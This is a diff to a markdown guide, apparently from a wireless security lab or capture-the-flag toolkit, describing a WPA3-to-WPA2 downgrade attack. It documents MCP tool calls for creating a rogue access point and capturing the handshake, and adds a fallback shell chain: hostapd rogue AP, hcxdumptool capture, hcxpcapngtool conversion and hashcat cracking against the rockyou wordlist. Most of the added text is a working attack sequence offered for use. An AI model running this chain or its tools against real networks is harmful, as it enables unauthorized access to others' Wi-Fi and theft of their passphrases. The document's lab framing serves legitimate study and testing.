@@ -35,8 +35,22 @@ wpa_key_mgmt=WPA-PSK          # WPA2 only, no SAE
 rsn_pairwise=CCMP
 ```
 
-Bring it up next to the real AP with `do_create_rogue_ap`, then
-capture the 4-way with `do_capture_handshake`.
+Bring it up next to the real AP with `do_create_rogue_ap` (real MCP
+tool — `server.do_create_rogue_ap(ssid, channel, security='wpa2',
+psk=..., bssid=...)`), then capture the 4-way with
+`do_capture_handshake` (real MCP tool —
+`server.do_capture_handshake(bssid, timeout_s, deauth_client, ...)`).
+
+**Fallback shell chain (no MCP):**
+
+```bash
+sudo hostapd /etc/hostapd/rogue-wpa2.conf &
+sudo hcxdumptool -i wlan1 -c <target-channel> \
+    -w /tmp/downgrade.pcapng --disable_deauthentication=1
+# after a client falls to the WPA2 rogue and completes M1..M4:
+hcxpcapngtool -o /tmp/hs.22000 /tmp/downgrade.pcapng
+hashcat -m 22000 /tmp/hs.22000 /opt/wordlists/rockyou.txt
+```
 
 ## The flag surface
 
